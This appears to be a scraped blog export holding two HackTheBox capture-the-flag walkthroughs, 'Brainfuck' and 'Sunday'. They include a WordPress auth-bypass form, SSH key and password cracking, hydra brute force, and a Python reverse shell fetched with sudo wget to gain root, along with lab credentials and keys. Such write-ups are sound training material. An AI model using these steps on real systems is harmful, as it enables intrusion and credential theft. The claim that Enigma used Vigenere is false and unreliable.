type=\"hidden\" name=\"email\" value=\"sth\"> <input type=\"hidden\" name=\"action\" value=\"loginGuestFacebook\"> <input type=\"submit\" value=\"Login\"> </form> All we have to do in this case is to put the PoC of the above output on a file and save it as html with few modifications: <form method=\"post\" action=\"https://brainfuck.htb/wp-admin/admin-ajax.php\"> Username: <input type=\"text\" name=\"username\" value=\"administrator\"> <input type=\"hidden\" name=\"email\" value=\"orestis@brainfuck.htb\"> <input type=\"hidden\" name=\"action\" value=\"loginGuestFacebook\"> <input type=\"submit\" value=\"Login\"> </form> So I change the url to https://brainfuck.htb. We found two users with wpscan, \"admin\" and \"administrator\" so we can probably leave the latter there. We also add the email I found. Then from the same directory where I save that html I run a simple python http server. From my browser I enter the url of the location of the exploit and I get the result above, so I click on login. After a bit of loading seemed nothing happened, I got a blank page. However, I opened another tab in the browser and navigated again to https://brainfuck.htb and got this: same page as before but on the upper right site we can see I am now logged in as administrator. In fact, I can navigate to the administrtor personal profile: I started exploring but I did not find anything useful. I have been particularly looking for a place where I could upload some php code that would potentially give me a shell. So I decided to try the same process with the other user, \"admin\". With admin I got way more menu options including one to upload media, themes, etc. Unfortunately, whether I try to upload a php webshell hidden into a jpg file or I try to edit one of the existing php theme functions there is a major issue, that is these files are not writable probably as an extra security measure. In fact, when trying to upload an image I get this error: Unable to create directory wp-content/uploads/2019/12. Is it parent directory writable by the server? Instead, in the edit themes session I can see this message: You need to make this file writable before you can save your changes. See the Codex for more information. I spent quite some time online looking for a solution but looks like these permissions can only be changed manually from configuration files which we do not have access to (yet). In the end I opted for another path. From the nmap scan we saw SMTP, POP3 and IMAP ports are open. I also see that there is a wordpress plugin installed on the website called Easy WP SMTP . When I go to the plugin configuration page I see the credentials and other details. The password is obfuscated but we can see it easily by opening the browser inspector as shown in the below screenshot. So we have the SMTP credentials: username --> orestis password --> kHGuERB29DNiNE Now we can loging to the POP3 server and read the messages: root@SittingDucks:~# telnet 10 .10.10.17 110 Trying 10.10.10.17... Connected to 10.10.10.17. Escape character is '&#94;]'. +OK Dovecot ready. USER orestis +OK PASS kHGuERB29DNiNE +OK Logged in. LIST +OK 2 messages: 1 977 2 514 . RETR 2 +OK 514 octets Return-Path: <root@brainfuck.htb> X-Original-To: orestis Delivered-To: orestis@brainfuck.htb Received: by brainfuck (Postfix, from userid 0) id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST) To: orestis@brainfuck.htb Subject: Forum Access Details Message-Id: <20170429101206.4227420AEB@brainfuck> Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST) From: root@brainfuck.htb (root) Hi there, your credentials for our \"secret\" forum are below :) username: orestis password: kIEnnfEKJ#9UmdO Regards There are two emails and only one had useful info. In fact, it contains some credentials I used to successfully login to sup3rs3cr3t.brainfuck.htb. In here there are two interesting discussion threads about an ssh key but the most interesting part is encrypted. From the post in clear text I notice orestis always ends his comments with the sentence Orestis - Hacking for fun and profit . Then in the encrypted post I can see orestis ends the three comments like this: Pieagnm - Jkoijeg nbw zwx mle grwsnn Wejmvse - Fbtkqal zqb rso rnl cwihsf Qbqquzs - Pnhekxs dpi fca fhf zdmgzt so we can see there is a similar pattern but the cypher-text is different every time. If you are a bit familiar with cryptography, this seems similar to the Vigenere cipher which is an evolution of the Caesar substitution. With Vigenere, a message is encrypted using a shared key and a table that contains the 26 letters of the Latin alphabet. This looks to be the same encryption used by the Enigma machine in the WW2. The Enigma was eventually cracked because the Germans placed \"Heil Hitler\" at the end of every message. Similarly we can use the same strategy but instead we will have the sentence \"Orestis - Hacking for fun and profit\" at the end of each message which will lead us to crack Enigma. That being said, we will use a one time pad decoder first to find the key: As we can see from the three screenshots above the common key that is repeated in sequence is fuckmybrain Once we have this info we can use the vigenere decoder to derypt the interesting bit, that is the ssh key: Using the link we decrypted we can now see this ssh key: root@SittingDucks:/home/user/Downloads# cat id_rsa -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382 mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/ B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ 7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+ Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59 krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF 9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi 6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ -----END RSA PRIVATE KEY----- Since the key is encrypted we can try to brute force it using John . Before we can use John to bute force the key we need to convert the ssh key in a format John can work with. To do so we can use a tool called sshng2john . root@SittingDucks:~# ./sshng2john.py /home/user/Downloads/id_rsa > id_rsa_john root@SittingDucks:~# cat id_rsa_john 16 /home/user/Downloads/id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c64d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190 Then I launch John and just after less than 10 minutes it finds the key: root@SittingDucks:~# john id_rsa_john --wordlist = /usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 8 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:03:54 30.05% (ETA: 16:44:35) 0g/s 19124p/s 19124c/s 19124C/s putterfly..puttaro 0g 0:00:06:45 53.69% (ETA: 16:44:11) 0g/s 19184p/s 19184c/s 19184C/s grumbles5..gruiz_24 0g 0:00:09:31 76.59% (ETA: 16:44:02) 0g/s 19215p/s 19215c/s 19215C/s KdificilEsCrYo..Kcn2048 3poulakia! (/home/user/Downloads/id_rsa) Session completed So now I can ssh to the box with the ssh key that whose password is 3poulakia! root@SittingDucks:~# ssh -i /home/user/Downloads/id_rsa orestis@10.10.10.17 The authenticity of host '10.10.10.17 (10.10.10.17)' can't be established. ECDSA key fingerprint is SHA256:S+b+YyJ/+y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.17' (ECDSA) to the list of known hosts. Enter passphrase for key '/home/user/Downloads/id_rsa': Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. You have mail. Last login: Wed May 3 19:46:00 2017 from 10.10.11.4 a simple ls gives us this output: orestis@brainfuck:~$ ls debug.txt encrypt.sage mail output.txt user.txt and therefore we can read the user.txt orestis@brainfuck:~$ cat user.txt 2c****************************c9 Inspecting the content of the home directory, I find encrypt.sage pretty interesting: orestis@brainfuck:~$ cat encrypt.sage nbits = 1024 password = open(\"/root/root.txt\").read().strip() enc_pass = open(\"output.txt\",\"w\") debug = open(\"debug.txt\",\"w\") m = Integer(int(password.encode('hex'),16)) p = random_prime(2&#94;floor(nbits/2)-1, lbound=2&#94;floor(nbits/2-1), proof=False) q = random_prime(2&#94;floor(nbits/2)-1, lbound=2&#94;floor(nbits/2-1), proof=False) n = p*q phi = (p-1)*(q-1) e = ZZ.random_element(phi) while gcd(e, phi) != 1: e = ZZ.random_element(phi) c = pow(m, e, n) enc_pass.write('Encrypted Password: '+str(c)+'\\n') debug.write(str(p)+'\\n') debug.write(str(q)+'\\n') debug.write(str(e)+'\\n') Again, if you are familiar with cryptography, this may resamble to RSA encryption . Particularly interesting is that the debug entries at the end of the file indicate that p , q , and e are written in debug.txt. orestis@brainfuck:~$ cat debug.txt 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 So looking ad debug.txt we should have p , q , and e respectively on each separate line. I then started to look on google for a way to retrieve d (the decryption key) from p , q , and e . I found a python script on a stackexchange post which may do the trick: def egcd ( a , b ): x , y , u , v = 0 , 1 , 1 , 0 while a != 0 : q , r = b // a , b % a m , n = x - u * q , y - v * q b , a , x , y , u , v = a , r , u , v , m , n gcd = b return gcd , x , y def main (): p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 # compute n n = p * q # Compute phi(n) phi = ( p - 1 ) * ( q - 1 ) # Compute modular inverse of e gcd , a , b = egcd ( e , phi ) d = a print ( \"n: \" + str ( d ) ); # Decrypt ciphertext pt = pow ( ct , d , n ) print ( \"pt: \" + str ( pt ) ) if __name__ == \"__main__\" : main () I replaced p , q , and e with the values found on debug.txt and the cypher-text ct with the value found in output.txt. root@SittingDucks:~# python decrypt_rsa.py n: 8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977 pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750 so we got pt , the plain-text, which we now need to convert into readable ascii. Since it was originally converted from string to hex and then to int, we now first convert it to hex and then back to string as follow: root@SittingDucks:~# python Python 2.7.17 (default, Oct 19 2019, 23:36:22) [GCC 9.2.1 20191008] on linux2 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. > >> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750 > >> print ( str ( hex ( pt )[ 2 :-1 ]) .decode ( 'hex' )) 6efc1a5dbb8904751ce6566a305bb8ef The string we obtain is the root.txt.","tags":"blogging","loc":"https://sittingducks.io/Brainfuck.html","title":"Brainfuck"},{"url":"https://sittingducks.io/Sunday.html","text":"On this article I am going to demo a machine called Sunday from hackthebox. Initial Nmap As usual we start our enumeration with nmap. I initially ran an nmap on the default ports but since I wasn't going anywhere I decided to run a full scan with the \"-p-\" parameter and indeed I got two extra non-default ports. After all, in a real engagement we will most probably run a full scan unless there are any specific reasons to do otherwise. user@SittingDucks:~$ nmap -p- -oA Documents/htb/boxes/sunday/allPorts_nmap 10 .10.10.76 --max-retries 0 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 07:01 GMT Warning: 10.10.10.76 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.76 Host is up (0.11s latency). Not shown: 62619 filtered ports, 2912 closed ports PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 22022/tcp open unknown 47869/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 110.91 seconds Since the non-default ports found have unknown services I run another targeted scan on these ports to see if I can find out more. user@SittingDucks:~$ nmap -sV -p 22022 ,47869 10 .10.10.76 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 07:06 GMT Nmap scan report for 10.10.10.76 Host is up (0.097s latency). PORT STATE SERVICE VERSION 22022/tcp open ssh SunSSH 1.3 (protocol 2.0) 47869/tcp open rpcbind Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.28 seconds The above scan tells us that an ssh service is running on port 22022 and an rcpbind service on port 47869. Enumerating users with finger In the first scan we found the finger service running on port 79. Finger is a simple network protocol that allows clients to request users information to a server running the finger service. The program can provide information such as whether a user is currently logged on, the email address, full name, etc. This is an old protocol and although might have been considered useful in the past, today its use is quite questionable in terms of privacy and security. To query the server you can do something similar from a machine where the finger client is installed: root@SittingDucks:~# finger @10.10.10.76 No one logged on root@SittingDucks:~# finger test@10.10.10.76 Login Name TTY Idle When Where test ??? root@SittingDucks:~# finger root@10.10.10.76 Login Name TTY Idle When Where root Super-User pts/3 <Apr 24, 2018> sunday root@SittingDucks:~# The first command tells us there is no one currently logged on on the box. In the second command I just use test as the user as I don't know any user names. Last I use root and I got some information. Now, since we know ssh is running we could definitely try to brute-force using root but it is highly unlikely we can get in as ssh root login could be disabled. To have more chances of success we should find out other users present in the box and then see if we can get in using one of them. While doing some research online I found a tool at pentestmonkey called finger-user-enum.pl. This simple perl script can help us querying the server to gather information on users. I think there is also a metasploit module that can assist on that but I prefer to use manual scripts as much as I can. root@SittingDucks:~$ perl finger-user-enum.pl -U /usr/share/SecLists/Usern ames/Names/names.txt -t 10.10.10.76| less -S Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Worker Processes ......... 5 Usernames file ........... /usr/share/SecLists/Usernames/Names/names.txt Target count ............. 1 Username count ........... 10163 Target TCP port .......... 79 Query timeout ............ 5 secs Relay Server ............. Not used # ####### Scan started at Sat Dec 7 07:01:58 2019 ######### access@10.10.10.76: access No Access User < . . . . >..nobody4 SunOS 4.x NFS Anonym < . . . . >.. admin@10.10.10.76: Login Name TTY Idle When Where..adm Admin < . . . . >..lp Line Printer Admin > anne marie@10.10.10.76: Login Name TTY Idle When Where..anne ???..marie ???.. bin@10.10.10.76: bin ??? < . . . . >.. dee dee@10.10.10.76: Login Name TTY Idle When Where..dee ???..dee ???.. la verne@10.10.10.76: Login Name TTY Idle When Where..la ???..verne ???.. message@10.10.10.76: Login Name TTY Idle When Where..smmsp SendMail Message Sub < . . . . >.. miof mela@10.10.10.76: Login Name TTY Idle When Where..miof ???..mela ???.. sammy@10.10.10.76: sammy pts/2 <Apr 24, 2018> 10.10.14.4 .. sunny@10.10.10.76: sunny pts/3 <Apr 24, 2018> 10.10.14.4 .. sys@10.10.10.76: sys ??? < . . . . >.. # ####### Scan completed at Sat Dec 7 07:39:50 2019 ######### 11 results. 10163 queries in 2272 seconds (4.5 queries / sec) The above output contains interesting results. Particularly we can see the users sammy and sunny use a pts terminal instead of a tty like the rest of users. Furthermore, the root user is missing from the list and probably because it is not included in the names.txt file. We know, however, from the test we did before that the root user uses the same terminal as the users sammy and sunny so these are probably the users we are looking for. SSH brute force So now I start an ssh brute-force attack using hydra against the user sunny. To do that I used a standard passwords list, called rockyou, you can find in kali: root@SittingDucks:~# hydra -s 22022 -l sunny -P /usr/share/wordlists/rockyou.txt -t 50 1 0.10.10.76 ssh Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-12 10:34:10 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 50 tasks per 1 server, overall 50 tasks, 14344399 login tries (l:1/p:14344399), ~286888 tries per task [DATA] attacking ssh://10.10.10.76:22022/ [STATUS] 891.00 tries/min, 891 tries in 00:01h, 14343609 to do in 268:19h, 50 active [STATUS] 587.67 tries/min, 1763 tries in 00:03h, 14342737 to do in 406:47h, 50 active [ERROR] ssh target does not support password auth [22022][ssh] host: 10.10.10.76 login: sunny password: sunday 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 45 final worker threads did not complete until end. [ERROR] 45 targets did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-12 10:38:50 Although hydra threw an error and I was about to stop the scan, I still got a result straight after! So the password for the user sunny is sunday . To be fair, the first thing one has to do is trying few basic passwords and combinations of it. With that in mind we could have easily guessed it but the whole point here was to demonstrate a simple ssh brute-force attack. Now, I run the same brute force attack for the user sammy in the background and at the same time I try to ssh with sunny. user@SittingDucks:~$ ssh -p 22022 sunny@10.10.10.76 Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 I googled this up and I found out at openssh.com that this is a legacy issue and can be circumvented by using this command: user@SittingDucks:~$ ssh -p 22022 -oKexAlgorithms = +diffie-hellman-group1-sha1 sunny@10.10.10.76 Password: Last login: Thu Dec 12 10:39:10 2019 from 10.10.14.46 Sun Microsystems Inc. SunOS 5.11 snv_111b November 2008 sunny@sunday:~$ I can see I am dealing with an old Solaris box. We could probably leverage some vulnerabilities later on given its age. For those unfamiliar with hackthebox, the objectives are mainly two. The first is to find a user.txt file (usually found in the user home) and the other is to find a root.txt file (usually found in /root) . Both files contain a hash that you can then submit to hackthebox to prove that you gained user access and then you were able to successfully escalate privileges to root. With that in mind I look for the user.txt file: sunny@sunday:~$ find / -name user.txt find: /export/home/sammy/.gnome2: Permission denied find: /export/home/sammy/.gconf: Permission denied /export/home/sammy/Desktop/user.txt sunny@sunday:~$ cat /export/home/sammy/Desktop/user.txt cat: /export/home/sammy/Desktop/user.txt: Permission denied looks like the file is located under the user sammy home directory and sunny does not have permission to access it. Probably the most immediate thing one should do is to check what the user sunny is allowed to do as root. The \"sudo -l\" command can help with that: sunny@sunday:~$ sudo -l User sunny may run the following commands on this host: (root) NOPASSWD: /root/troll I can see sunny is allowed to execute troll without the need of the password. When executing troll we just see sunny@sunday:~$ sudo /root/troll testing uid=0(root) gid=0(root) which is not very useful. From Sunny to Sammy (hash brute force) Before doing some enumeration with aid of scripts I check the folder structure to see if we have something useful. sunny@sunday:~$ cd / sunny@sunday:/$ ls -l total 524 drwxr-xr-x 2 root root 4 2018-04-15 20:44 backup lrwxrwxrwx 1 root root 9 2018-04-15 19:52 bin -> ./usr/bin drwxr-xr-x 6 root sys 7 2018-04-15 19:52 boot drwxr-xr-x 2 root root 2 2018-04-16 15:33 cdrom drwxr-xr-x 265 root sys 265 2019-12-12 09:30 dev drwxr-xr-x 10 root sys 10 2019-12-12 09:30 devices drwxr-xr-x 77 root sys 224 2019-12-12 11:34 etc drwxr-xr-x 3 root root 3 2018-04-15 19:44 export dr-xr-xr-x 1 root root 1 2019-12-12 09:31 home drwxr-xr-x 19 root sys 20 2018-04-15 19:45 kernel drwxr-xr-x 10 root bin 180 2018-04-15 19:45 lib drwx------ 2 root root 2 2009-05-14 21:27 lost+found drwxr-xr-x 2 root root 4 2019-12-12 09:31 media drwxr-xr-x 2 root sys 2 2018-04-15 19:52 mnt dr-xr-xr-x 1 root root 1 2019-12-12 09:31 net drwxr-xr-x 4 root sys 4 2018-04-15 19:52 opt drwxr-xr-x 5 root sys 5 2009-05-14 21:21 platform dr-xr-xr-x 56 root root 480032 2019-12-12 12:06 proc drwx------ 6 root root 13 2018-04-24 10:31 root drwxr-xr-x 4 root root 4 2018-04-15 19:52 rpool drwxr-xr-x 2 root sys 58 2018-04-15 19:53 sbin drwxr-xr-x 4 root root 4 2009-05-14 21:18 system drwxrwxrwt 4 root sys 384 2019-12-12 09:31 tmp drwxr-xr-x 30 root sys 44 2018-04-15 19:46 usr drwxr-xr-x 35 root sys 35 2018-04-15 20:26 var The / directory shows a backup folder which I don't think is a system default folder. sunny@sunday:/backup$ ls -l total 2 -r-x--x--x 1 root root 53 2018-04-24 10:35 agent22.backup -rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup sunny@sunday:/backup$ cat agent22.backup cat: agent22.backup: Permission denied sunny@sunday:/backup$ cat shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$ i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$ Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636:::::: As shown above we have the hash of the user sammy and so we can try to crack it. First I checked online into one of the numerous websites to understand what kind of hash is this and the result is: sha256crypt, SHA256(Unix) then from the hashcat official website hashes example I found out that the corresponding hash-mode is 7400. With this knowledge we can shorten the time hashcat would take to crack the password since it will try less combinations. I run hashcat and after some time I got this result: root@SittingDucks:~# hashcat -m 7400 /home/user/Documents/htb/boxes/sunday/sammy_hash /usr/share/wordlists/rockyou.txt --force hashcat (v5.1.0) starting... OpenCL Platform #1: The pocl project ==================================== * Device #1: pthread-Intel(R) Core(TM) i7-6820HQ CPU @ 2.70GHz, 1024/2647 MB allocatable, 2MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 2 secs [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s $ 5 $Ebkn8jlK$i6SSPa0 .u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude! Session..........: hashcat Status...........: Cracked Hash.Type........: sha256crypt $5$, SHA256 (Unix) Hash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB Time.Started.....: Thu Dec 12 14:22:11 2019 (13 mins, 5 secs) Time.Estimated...: Thu Dec 12 14:35:16 2019 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 260 H/s (12.51ms) @ Accel:128 Loops:64 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 203776/14344385 (1.42%) Rejected.........: 0/203776 (0.00%) Restore.Point....: 203520/14344385 (1.42%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000 Candidates.#1....: coolster -> chs2009 so sammy's password is \"cooldude!\". sunny@sunday:~$ su - sammy Password: Sun Microsystems Inc. SunOS 5.11 snv_111b November 2008 sammy@sunday:~$ id uid=101(sammy) gid=10(staff) groups=10(staff) At this stage I was able to move to sammy's Desktop and read the user.txt file. Now let's see what we can do to root this box. sammy@sunday:~$ sudo -l User sammy may run the following commands on this host: (root) NOPASSWD: /usr/bin/wget From the above extract we can see that sammy can run wget so we can use it to potentially download something to the victim box? During my research I found several methods for rooting this box. So I decided to try them all for learning purposes: ROOT privesc I found several ways to root this box and I will list them all here. 1. Overwriting troll sunny@sunday:~$ sudo /root/troll testing uid=0(root) gid=0(root) Just to recap the above output shows what troll contains. I dowload a simple python shell in my kali box from the Internet and save the content in a file (shell.py) #!/usr/bin/python import socket import subprocess import os s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( \"10.10.14.46\" , 9999 )) os . dup2 ( s . fileno (), 0 ) os . dup2 ( s . fileno (), 1 ) os . dup2 ( s . fileno (), 2 ) p = subprocess . call ([ \"/bin/sh\" , \"-i\" ]); Then I create a simple python http server in the directory where the shell.py is located and I overwrite troll with shell.py: root@SittingDucks:/home/user/Documents/htb/boxes/sunday# python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... and from sunday: sammy@sunday:~$ sudo wget http://10.10.14.46:8000/shell.py -O /root/troll --21:01:45-- http://10.10.14.46:8000/shell.py => `/root/troll' Connecting to 10.10.14.46:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 246 [text/plain] 100%[==================================================================================================================>] 246 --.--K/s 21:01:45 (68.40 MB/s) - `/root/troll' saved [246/246] now before running troll I open a netcat listener in my kali 